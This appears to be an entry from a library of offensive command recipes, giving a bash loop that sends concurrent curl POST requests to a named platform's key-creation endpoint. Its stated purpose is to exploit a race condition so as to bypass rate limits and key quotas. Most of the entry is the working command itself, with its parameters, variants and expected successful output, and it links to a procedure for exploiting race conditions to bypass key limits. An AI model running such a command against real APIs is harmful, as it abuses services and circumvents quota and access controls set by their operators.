---
data: >-
  for i in {1..10}; do curl -X POST https://api.enjinplatform.com/create-key -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d
  '{"name": "test_key_$i", "permissions": ["read"]}' -w "Key $i created:
  %{http_code}\n" & done; wait
tags:
  - api
  - race-condition
type: command
executor: bash
platforms:
  - Linux
  - Web
id: d729d3dc-cf25-43a9-aaed-7b4a296958e5
created_at: '2025-12-14T17:32:28.960Z'
updated_at: '2025-12-14T17:32:28.960Z'
verified: false
validated: true
submitted: true
---
# send-rapid-api-requests

## Command

```bash
for i in {1..10}; do curl -X POST https://api.enjinplatform.com/create-key -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"name": "test_key_$i", "permissions": ["read"]}' -w "Key $i created: %{http_code}\n" & done; wait
```

## Description

This bash loop sends multiple concurrent POST requests to an API endpoint using curl in the background (&), exploiting race conditions by overwhelming the server with rapid submissions. The 'wait' ensures all requests complete before proceeding. Use it to test or bypass rate limits or quotas in unsynchronized APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in {1..N}` | Loop counter for number of requests (e.g., 10) | Yes |
| `curl -X POST` | HTTP method and endpoint URL | Yes |
| `-H "Authorization: Bearer TOKEN"` | Authentication header with bearer token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d 'JSON_PAYLOAD'` | Request body with key creation data | Yes |
| `-w "FORMAT"` | Custom output writer for response codes | No |
| `&` | Runs curl in background for concurrency | Yes |
| `wait` | Waits for all background processes to finish | Yes |

## Examples

### Basic Usage

```bash
for i in {1..5}; do curl -X POST https://example-api.com/create -H "Auth: token" -d '{}' & done; wait
```

### Advanced Usage

```bash
# With JSON file and verbose output
cat payload.json | while read line; do curl -X POST https://api.example.com/endpoint -H "Content-Type: application/json" -d "$line" -v & done; wait
```

## Expected Output

A series of lines like "Key 1 created: 201", "Key 2 created: 201", etc., indicating successful HTTP responses for each request. If the race condition is exploited, more successes than the quota allow.

## Related

- [[Related Procedure: Exploit-Race-Condition-in-API-to-Bypass-Key-Limits]]
